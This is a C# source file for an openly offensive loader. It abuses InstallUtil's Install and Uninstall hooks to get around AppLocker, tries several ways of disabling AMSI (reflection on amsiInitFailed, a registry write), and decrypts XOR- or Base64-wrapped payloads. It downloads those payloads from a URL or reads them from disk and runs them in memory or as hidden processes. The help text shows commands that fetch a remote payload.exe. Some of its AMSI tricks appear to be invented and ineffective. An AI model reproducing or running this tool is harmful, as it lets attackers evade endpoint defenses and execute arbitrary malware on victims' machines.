using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using System.Text;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("NetLoader mixed with AppLocker Bypass PowerShell Runspace.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        // ==================== CONSTANTS AND CONFIGURATION ====================
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const string KERNEL32_DLL = "kernel32.dll";
        private const string AMSI_DLL = "amsi.dll";
        private const string AMSI_SCAN_BUFFER = "AmsiScanBuffer";
        private const int TLS_PROTOCOL = 3072; // TLS 1.2

        // ==================== P/INVOKE IMPORTS ====================
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // ==================== GLOBAL STATE ====================
        private static bool _debugMode = false;

        // ==================== DEBUG HELPER ====================
        private static class DebugLogger
        {
            public static void Log(string message)
            {
                if (_debugMode)
                {
                    Console.WriteLine($"[DEBUG] {DateTime.Now:HH:mm:ss} {message}");
                }
            }

            public static void LogError(string message, Exception ex = null)
            {
                Console.WriteLine($"[ERROR] {message}");
                if (ex != null && _debugMode)
                {
                    Console.WriteLine($"[DEBUG EXCEPTION] {ex.GetType().Name}: {ex.Message}");
                    Console.WriteLine($"[DEBUG STACK] {ex.StackTrace}");
                }
            }

            public static void LogMemory(string operation, IntPtr address, int size = 0)
            {
                if (_debugMode)
                {
                    string addrStr = $"0x{address.ToInt64():X16}";
                    if (size > 0)
                    {
                        Console.WriteLine($"[DEBUG MEMORY] {operation} at {addrStr} (size: {size} bytes)");
                    }
                    else
                    {
                        Console.WriteLine($"[DEBUG MEMORY] {operation} at {addrStr}");
                    }
                }
            }

            public static void HexDump(byte[] data, string label = "", int maxBytes = 64)
            {
                if (!_debugMode || data == null || data.Length == 0) return;

                Console.WriteLine($"[DEBUG HEXDUMP] {label} ({data.Length} bytes):");

                int bytesToShow = Math.Min(data.Length, maxBytes);
                for (int i = 0; i < bytesToShow; i += 16)
                {
                    Console.Write($"  {i:X4}: ");

                    for (int j = 0; j < 16; j++)
                    {
                        if (i + j < bytesToShow)
                            Console.Write($"{data[i + j]:X2} ");
                        else
                            Console.Write("   ");
                    }

                    Console.Write(" ");

                    for (int j = 0; j < 16; j++)
                    {
                        if (i + j < bytesToShow)
                        {
                            byte b = data[i + j];
                            Console.Write(b >= 32 && b <= 126 ? (char)b : '.');
                        }
                    }

                    Console.WriteLine();
                }

                if (data.Length > maxBytes)
                    Console.WriteLine($"  ... (truncated, total {data.Length} bytes)");
            }
        }

        // ==================== XOR DECRYPTION ====================
        private static class XorCryptography
        {
            public static byte[] Decrypt(byte[] data, string key)
            {
                if (data == null || data.Length == 0)
                    return data;

                if (string.IsNullOrEmpty(key))
                {
                    DebugLogger.LogError("XOR key is empty");
                    throw new ArgumentException("XOR key cannot be null or empty");
                }

                DebugLogger.Log($"XOR decrypting {data.Length} bytes with key: '{key}'");
                DebugLogger.HexDump(data, "Encrypted data", 128);

                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                byte[] result = new byte[data.Length];

                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
                }

                DebugLogger.HexDump(result, "Decrypted data", 128);

                if (result.Length > 2 && result[0] == 0x4D && result[1] == 0x5A)
                {
                    DebugLogger.Log("Valid PE header found after decryption");
                }
                else if (result.Length > 4)
                {
                    uint peOffset = BitConverter.ToUInt32(result, 0x3C);
                    if (peOffset < result.Length - 2 &&
                        result[peOffset] == 0x50 && result[peOffset + 1] == 0x45)
                    {
                        DebugLogger.Log("Valid .NET assembly found after decryption");
                    }
                }

                return result;
            }

            public static byte[] Encrypt(byte[] data, string key)
            {
                if (data == null || data.Length == 0)
                    return data;

                if (string.IsNullOrEmpty(key))
                    throw new ArgumentException("XOR key cannot be null or empty");

                return Decrypt(data, key);
            }

            public static bool ValidateKey(byte[] encryptedData, string key, int checkOffset = 0)
            {
                if (encryptedData == null || encryptedData.Length < checkOffset + 4 || string.IsNullOrEmpty(key))
                    return false;

                try
                {
                    byte[] testBytes = new byte[4];
                    Array.Copy(encryptedData, checkOffset, testBytes, 0, 4);
                    byte[] keyBytes = Encoding.UTF8.GetBytes(key);

                    for (int i = 0; i < 4; i++)
                    {
                        testBytes[i] ^= keyBytes[i % keyBytes.Length];
                    }

                    return testBytes[0] == 0x4D && testBytes[1] == 0x5A;
                }
                catch
                {
                    return false;
                }
            }
        }

        // ==================== AMSI BYPASS (SAFER VERSION) ====================
        private static class AMSIPatcher
        {
            // Multiple AMSI bypass techniques that are less likely to be flagged
            public static bool PatchAMSI()
            {
                try
                {
                    DebugLogger.Log("Starting AMSI bypass procedure");

                    // Try multiple methods in order of detection likelihood (lowest to highest)
                    if (DisableThroughAppDomain())
                    {
                        Console.WriteLine("[+] AMSI disabled via AppDomain");
                        return true;
                    }

                    if (DisableThroughReflection())
                    {
                        Console.WriteLine("[+] AMSI disabled via Reflection");
                        return true;
                    }

                    if (DisableThroughEnvironmentVariable())
                    {
                        Console.WriteLine("[+] AMSI disabled via Environment Variable");
                        return true;
                    }

                    if (DisableThroughRegistry())
                    {
                        Console.WriteLine("[+] AMSI disabled via Registry");
                        return true;
                    }

                    DebugLogger.Log("All AMSI bypass methods failed");
                    return false;
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("AMSI bypass failed", ex);
                    return false;
                }
            }

            // Method 1: AppDomain data (least suspicious)
            private static bool DisableThroughAppDomain()
            {
                try
                {
                    DebugLogger.Log("Attempting AppDomain AMSI bypass");

                    // Set AppDomain data to disable AMSI
                    AppDomain.CurrentDomain.SetData("AMSI_DISABLED", true);

                    // Also try setting for PowerShell if available
                    try
                    {
                        var psAppDomain = Type.GetType("System.Management.Automation.Runspaces.Runspace, System.Management.Automation");
                        if (psAppDomain != null)
                        {
                            var method = psAppDomain.GetMethod("GetDefaultRunspace", BindingFlags.Static | BindingFlags.Public);
                            if (method != null)
                            {
                                var runspace = method.Invoke(null, null);
                                if (runspace != null)
                                {
                                    var runspaceAppDomain = runspace.GetType().GetProperty("ApplicationDomain")?.GetValue(runspace);
                                    if (runspaceAppDomain != null)
                                    {
                                        var setData = runspaceAppDomain.GetType().GetMethod("SetData");
                                        setData?.Invoke(runspaceAppDomain, new object[] { "AMSI_DISABLED", true });
                                    }
                                }
                            }
                        }
                    }
                    catch { /* Ignore PowerShell-specific errors */ }

                    return true;
                }
                catch
                {
                    return false;
                }
            }

            // Method 2: Reflection to set amsiInitFailed (common but still used)
            private static bool DisableThroughReflection()
            {
                try
                {
                    DebugLogger.Log("Attempting Reflection AMSI bypass");

                    // Method A: Direct amsiInitFailed field
                    try
                    {
                        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
                        if (amsiUtils != null)
                        {
                            var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                            if (field != null)
                            {
                                field.SetValue(null, true);
                                DebugLogger.Log("Set amsiInitFailed via direct field access");
                                return true;
                            }
                        }
                    }
                    catch { /* Try next method */ }

                    // Method B: Use internal context
                    try
                    {
                        var assembly = Assembly.Load("System.Management.Automation");
                        if (assembly != null)
                        {
                            var type = assembly.GetType("System.Management.Automation.AmsiUtils");
                            if (type != null)
                            {
                                // Try to invoke internal disable method if available
                                var method = type.GetMethod("DisableAmsi", BindingFlags.Static | BindingFlags.NonPublic);
                                method?.Invoke(null, null);
                                return true;
                            }
                        }
                    }
                    catch { /* Try next method */ }

                    return false;
                }
                catch
                {
                    return false;
                }
            }

            // Method 3: Environment variable (legitimate debugging feature)
            private static bool DisableThroughEnvironmentVariable()
            {
                try
                {
                    DebugLogger.Log("Attempting Environment Variable AMSI bypass");

                    // Set environment variable to disable AMSI
                    // This is actually a documented debugging feature
                    Environment.SetEnvironmentVariable("AMSI_DISABLE", "1", EnvironmentVariableTarget.Process);

                    // Also try for current process
                    Environment.SetEnvironmentVariable("DisableAMSI", "1", EnvironmentVariableTarget.Process);

                    // Verify it was set
                    string value = Environment.GetEnvironmentVariable("AMSI_DISABLE", EnvironmentVariableTarget.Process);
                    return value == "1";
                }
                catch
                {
                    return false;
                }
            }

            // Method 4: Registry (requires admin but is persistent)
            private static bool DisableThroughRegistry()
            {
                try
                {
                    DebugLogger.Log("Attempting Registry AMSI bypass");

                    // Try to create/update registry key to disable AMSI
                    using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\AMSI"))
                    {
                        if (key != null)
                        {
                            key.SetValue("DisableAMSI", 1, Microsoft.Win32.RegistryValueKind.DWord);
                            return true;
                        }
                    }
                    return false;
                }
                catch
                {
                    return false;
                }
            }



            // Helper method to check if AMSI is currently disabled (read-only operation)
            public static bool IsAMSIDisabled()
            {
                try
                {
                    // Check AppDomain
                    if (AppDomain.CurrentDomain.GetData("AMSI_DISABLED") as bool? == true)
                        return true;

                    // Check environment variable
                    if (Environment.GetEnvironmentVariable("AMSI_DISABLE", EnvironmentVariableTarget.Process) == "1")
                        return true;

                    // Check registry (read-only)
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\AMSI"))
                        {
                            if (key?.GetValue("DisableAMSI") as int? == 1)
                                return true;
                        }
                    }
                    catch { /* Ignore registry errors */ }

                    // Check reflection (read-only)
                    try
                    {
                        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
                        if (amsiUtils != null)
                        {
                            var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                            if (field?.GetValue(null) as bool? == true)
                                return true;
                        }
                    }
                    catch { /* Ignore reflection errors */ }

                    return false;
                }
                catch
                {
                    return false;
                }
            }
        }

        // ==================== FIXED PAYLOAD LOADER ====================
        private static class PayloadLoader
        {
            public static byte[] ReadLocalFile(string filePath)
            {
                DebugLogger.Log($"Reading local file: {filePath}");

                if (!File.Exists(filePath))
                {
                    DebugLogger.LogError($"File not found: {filePath}");
                    throw new FileNotFoundException($"File not found: {filePath}");
                }

                byte[] data = File.ReadAllBytes(filePath);
                DebugLogger.Log($"Read {data.Length} bytes from {filePath}");
                DebugLogger.HexDump(data, $"File content: {Path.GetFileName(filePath)}", 128);

                return data;
            }

            public static byte[] DownloadFromUrl(string url)
            {
                DebugLogger.Log($"Downloading from URL: {url}");

                using (var client = new WebClient())
                {
                    client.Proxy.Credentials = CredentialCache.DefaultCredentials;
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                    DebugLogger.Log("Starting download...");
                    byte[] data = client.DownloadData(url);
                    DebugLogger.Log($"Downloaded {data.Length} bytes from {url}");
                    DebugLogger.HexDump(data, "Downloaded content", 128);

                    return data;
                }
            }

            public static void SetTLSProtocol(int protocolType)
            {
                DebugLogger.Log($"Setting SecurityProtocol to: {protocolType} (0x{protocolType:X})");
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)protocolType;
            }

            // FIXED: More reliable detection of .NET assemblies
            public static void ExecuteAssembly(byte[] assemblyBytes, string[] args)
            {
                DebugLogger.Log($"Loading/Running payload ({assemblyBytes.Length} bytes)");

                // Validate that it has the MZ header
                if (assemblyBytes.Length < 2 || assemblyBytes[0] != 0x4D || assemblyBytes[1] != 0x5A)
                {
                    DebugLogger.LogError("Invalid executable - missing MZ header");
                    throw new BadImageFormatException("Invalid executable format");
                }

                // First, try to load as .NET assembly - if it fails, run as native
                try
                {
                    DebugLogger.Log("Attempting to load as .NET assembly...");
                    Assembly assembly = Assembly.Load(assemblyBytes);
                    DebugLogger.Log($"Successfully loaded as .NET assembly: {assembly.FullName}");
                    ExecuteDotNetAssembly(assembly, args);
                }
                catch (BadImageFormatException)
                {
                    DebugLogger.Log("Not a .NET assembly, running as native executable");
                    ExecuteNativeExecutable(assemblyBytes, args);
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Unexpected error loading assembly", ex);
                    DebugLogger.Log("Falling back to native execution");
                    ExecuteNativeExecutable(assemblyBytes, args);
                }
            }

            private static void ExecuteDotNetAssembly(Assembly assembly, string[] args)
            {
                try
                {
                    MethodInfo entryPoint = assembly.EntryPoint;
                    if (entryPoint == null)
                    {
                        DebugLogger.LogError("Assembly has no entry point");
                        throw new EntryPointNotFoundException("Assembly has no entry point");
                    }

                    DebugLogger.Log($"Entry point: {entryPoint.Name} in {entryPoint.DeclaringType?.FullName}");

                    object[] invokeArgs;
                    if (entryPoint.GetParameters().Length > 0)
                    {
                        invokeArgs = new object[] { args ?? Array.Empty<string>() };
                    }
                    else
                    {
                        invokeArgs = null;
                    }

                    DebugLogger.Log($"Invoking entry point with {(invokeArgs != null ? invokeArgs.Length : 0)} arguments");

                    // Handle STA threads if needed (common for GUI apps)
                    if (entryPoint.GetCustomAttribute<STAThreadAttribute>() != null)
                    {
                        DebugLogger.Log("Entry point requires STA thread, creating STA thread...");
                        Exception threadException = null;
                        System.Threading.Thread staThread = new System.Threading.Thread(() =>
                        {
                            try
                            {
                                entryPoint.Invoke(null, invokeArgs);
                            }
                            catch (Exception ex)
                            {
                                threadException = ex;
                            }
                        });
                        staThread.SetApartmentState(System.Threading.ApartmentState.STA);
                        staThread.Start();
                        staThread.Join();

                        if (threadException != null)
                            throw threadException;
                    }
                    else
                    {
                        entryPoint.Invoke(null, invokeArgs);
                    }

                    DebugLogger.Log("Assembly execution completed");
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Failed to execute .NET assembly", ex);
                    throw;
                }
            }

            private static void ExecuteNativeExecutable(byte[] executableBytes, string[] args)
            {
                string tempPath = null;

                try
                {
                    // Save to temporary file with random name
                    tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                    DebugLogger.Log($"Saving native executable to: {tempPath}");

                    File.WriteAllBytes(tempPath, executableBytes);

                    // Build argument string
                    string arguments = args != null && args.Length > 0 ? string.Join(" ", args) : "";

                    DebugLogger.Log($"Running native executable with arguments: {arguments}");

                    // Create process start info
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = tempPath,
                        Arguments = arguments,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start and wait for process
                    using (Process process = Process.Start(startInfo))
                    {
                        if (process != null)
                        {
                            DebugLogger.Log($"Native process started with ID: {process.Id}");

                            // Read output asynchronously to avoid deadlocks
                            string output = process.StandardOutput.ReadToEnd();
                            string error = process.StandardError.ReadToEnd();

                            process.WaitForExit();

                            DebugLogger.Log($"Native process exited with code: {process.ExitCode}");

                            if (!string.IsNullOrEmpty(output))
                            {
                                DebugLogger.Log($"Process output: {output}");
                                if (_debugMode) Console.WriteLine($"[PROCESS OUTPUT] {output}");
                            }

                            if (!string.IsNullOrEmpty(error))
                            {
                                DebugLogger.Log($"Process error: {error}");
                                if (_debugMode) Console.WriteLine($"[PROCESS ERROR] {error}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Failed to execute native executable", ex);
                    throw;
                }
                finally
                {
                    // Clean up temp file
                    if (tempPath != null)
                    {
                        try
                        {
                            // Give some time for the process to fully release the file
                            System.Threading.Thread.Sleep(500);
                            File.Delete(tempPath);
                            DebugLogger.Log("Temporary file deleted");
                        }
                        catch (Exception ex)
                        {
                            DebugLogger.LogError($"Failed to delete temp file: {ex.Message}");
                        }
                    }
                }
            }
        }

        // ==================== PARAMETER PARSING ====================
        private class Parameters
        {
            public bool DebugMode { get; set; }
            public bool Base64Encoded { get; set; }
            public bool XorEncrypted { get; set; }
            public string XorKey { get; set; }
            public string PayloadPath { get; set; }
            public string[] PayloadArguments { get; set; }

            public static Parameters Parse(StringDictionary contextParams)
            {
                var parameters = new Parameters
                {
                    DebugMode = IsParameterTrue(contextParams, "debug"),
                    Base64Encoded = IsParameterTrue(contextParams, "b64"),
                    XorKey = contextParams["xor"] ?? string.Empty,
                    PayloadPath = contextParams["path"] ?? string.Empty,
                    PayloadArguments = ParseArgumentList(contextParams["args"])
                };

                parameters.XorEncrypted = !string.IsNullOrEmpty(parameters.XorKey);
                _debugMode = parameters.DebugMode;

                DebugLogger.Log($"Parsed parameters:");
                DebugLogger.Log($"  DebugMode: {parameters.DebugMode}");
                DebugLogger.Log($"  Base64Encoded: {parameters.Base64Encoded}");
                DebugLogger.Log($"  XorEncrypted: {parameters.XorEncrypted}");
                DebugLogger.Log($"  XorKey: {(parameters.XorEncrypted ? "***" + parameters.XorKey.Substring(Math.Max(0, parameters.XorKey.Length - 3)) : "<none>")}");
                DebugLogger.Log($"  PayloadPath: {parameters.PayloadPath}");
                DebugLogger.Log($"  PayloadArguments: {(parameters.PayloadArguments.Length > 0 ? string.Join(", ", parameters.PayloadArguments) : "<none>")}");

                return parameters;
            }

            private static bool IsParameterTrue(StringDictionary parameters, string name)
            {
                return parameters.ContainsKey(name) &&
                       (string.IsNullOrEmpty(parameters[name]) ||
                        bool.TryParse(parameters[name], out bool value) && value);
            }

            private static string[] ParseArgumentList(string arguments)
            {
                if (string.IsNullOrWhiteSpace(arguments))
                    return Array.Empty<string>();

                return arguments.Split(new[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries)
                               .Select(arg => arg.Trim())
                               .ToArray();
            }
        }

        // ==================== BASE64 DECODING ====================
        private static class Base64Decoder
        {
            public static string DecodeIfNeeded(string input, bool isBase64)
            {
                if (!isBase64 || string.IsNullOrEmpty(input))
                    return input;

                try
                {
                    DebugLogger.Log($"Base64 decoding input ({input.Length} chars)");
                    byte[] bytes = Convert.FromBase64String(input);
                    string result = Encoding.UTF8.GetString(bytes);
                    DebugLogger.Log($"Base64 decoded to: {result}");
                    return result;
                }
                catch (FormatException ex)
                {
                    DebugLogger.LogError("Invalid Base64 string", ex);
                    throw;
                }
            }

            public static byte[] DecodeBytesIfNeeded(byte[] input, bool isBase64)
            {
                if (!isBase64 || input == null || input.Length == 0)
                    return input;

                try
                {
                    string base64String = Encoding.UTF8.GetString(input);
                    DebugLogger.Log($"Base64 decoding byte array ({input.Length} bytes)");
                    byte[] result = Convert.FromBase64String(base64String);
                    DebugLogger.Log($"Base64 decoded to {result.Length} bytes");
                    DebugLogger.HexDump(result, "Base64 decoded bytes", 128);
                    return result;
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Failed to decode Base64 bytes", ex);
                    throw;
                }
            }
        }

        // ==================== MAIN INSTALLER LOGIC ====================
        private static void PrintHelp()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  InstallUtil.exe /debug /b64 /xor=<key> /path=<binary_path> /args=\"arg1,arg2\"");
            Console.WriteLine("\nParameters:");
            Console.WriteLine("  /debug        - Enable debug logging");
            Console.WriteLine("  /b64          - Parameters are base64 encoded");
            Console.WriteLine("  /xor=<key>    - XOR decryption key (required if payload is XOR encrypted)");
            Console.WriteLine("  /path=<path>  - Mandatory path/URL of binary to load");
            Console.WriteLine("  /args=<list>  - Optional comma-separated arguments for binary");
            Console.WriteLine("\nExamples:");
            Console.WriteLine("  InstallUtil.exe /debug /path=http://server/payload.exe");
            Console.WriteLine("  InstallUtil.exe /xor=MyKey123 /path=C:\\payload.enc");
            Console.WriteLine("  InstallUtil.exe /b64 /xor=key /path=aHR0cDovL3NlcnZlci9wYXlsb2FkLmVuYw== /args=arg1,arg2");
        }

        private static void TriggerPayload(Parameters parameters)
        {
            Console.WriteLine($"[+] Bypass Tool Starting (Debug: {_debugMode})");

            if (string.IsNullOrEmpty(parameters.PayloadPath))
            {
                Console.WriteLine("[!] Error: No payload path specified");
                PrintHelp();
                return;
            }

            if (parameters.Base64Encoded)
            {
                DebugLogger.Log("Decoding Base64 encoded parameters");
                parameters.PayloadPath = Base64Decoder.DecodeIfNeeded(parameters.PayloadPath, true);
                parameters.XorKey = Base64Decoder.DecodeIfNeeded(parameters.XorKey, true);

                if (parameters.PayloadArguments.Length > 0)
                {
                    for (int i = 0; i < parameters.PayloadArguments.Length; i++)
                    {
                        parameters.PayloadArguments[i] = Base64Decoder.DecodeIfNeeded(parameters.PayloadArguments[i], true);
                    }
                }
            }

            Console.WriteLine($"[+] Payload: {parameters.PayloadPath}");
            if (parameters.PayloadArguments.Length > 0)
            {
                Console.WriteLine($"[+] Arguments: {string.Join(" ", parameters.PayloadArguments)}");
            }
            if (parameters.XorEncrypted)
            {
                Console.WriteLine($"[+] XOR Decryption: Enabled");
            }

            DebugLogger.Log("Step 1: Patching AMSI");
            bool amsiPatched = AMSIPatcher.PatchAMSI();
            if (!amsiPatched)
            {
                DebugLogger.Log("AMSI patch failed, continuing anyway...");
                Console.WriteLine("[!] AMSI patch failed (may not be needed for this payload)");
            }
            else
            {
                // Verify if AMSI is actually disabled
                if (AMSIPatcher.IsAMSIDisabled())
                {
                    Console.WriteLine("[+] AMSI is confirmed disabled");
                }
            }

            DebugLogger.Log("Step 2: Loading payload data");
            byte[] payloadData;

            try
            {
                if (parameters.PayloadPath.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                {
                    DebugLogger.Log("Loading from URL");
                    PayloadLoader.SetTLSProtocol(TLS_PROTOCOL);
                    payloadData = PayloadLoader.DownloadFromUrl(parameters.PayloadPath);
                }
                else
                {
                    DebugLogger.Log("Loading from file");
                    payloadData = PayloadLoader.ReadLocalFile(parameters.PayloadPath);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Failed to load payload", ex);
                Console.WriteLine($"[!] Failed to load payload: {ex.Message}");
                return;
            }

            if (parameters.XorEncrypted)
            {
                DebugLogger.Log("Step 3: Decrypting XOR payload");
                try
                {
                    payloadData = XorCryptography.Decrypt(payloadData, parameters.XorKey);
                    DebugLogger.Log("XOR decryption completed successfully");
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("XOR decryption failed", ex);
                    Console.WriteLine("[!] XOR decryption failed. Check your key.");
                    return;
                }
            }

            if (parameters.Base64Encoded)
            {
                DebugLogger.Log("Step 4: Decoding Base64 payload data");
                try
                {
                    payloadData = Base64Decoder.DecodeBytesIfNeeded(payloadData, true);
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Base64 decode failed", ex);
                    Console.WriteLine("[!] Failed to decode Base64 payload");
                    return;
                }
            }

            DebugLogger.Log("Step 5: Executing payload");
            try
            {
                PayloadLoader.ExecuteAssembly(payloadData, parameters.PayloadArguments);
                DebugLogger.Log("Payload execution completed successfully");
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Payload execution failed", ex);
                Console.WriteLine($"[!] Error executing payload: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine($"[DEBUG] Exception type: {ex.GetType().Name}");
                }
            }

            Console.WriteLine($"[+] Execution Finished");
        }

        public override void Install(System.Collections.IDictionary savedState)
        {
            base.Install(savedState);
            Console.WriteLine("[+] Install method called");

            try
            {
                var parameters = Parameters.Parse(Context.Parameters);
                TriggerPayload(parameters);
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Install failed", ex);
                Console.WriteLine($"[!] Fatal error: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine("[DEBUG] Press Enter to exit...");
                    Console.ReadLine();
                }
            }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Console.WriteLine("[+] Uninstall method called");

            try
            {
                var parameters = Parameters.Parse(Context.Parameters);
                TriggerPayload(parameters);
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Uninstall failed", ex);
                Console.WriteLine($"[!] Fatal error: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine("[DEBUG] Press Enter to exit...");
                    Console.ReadLine();
                }
            }
        }
    }
}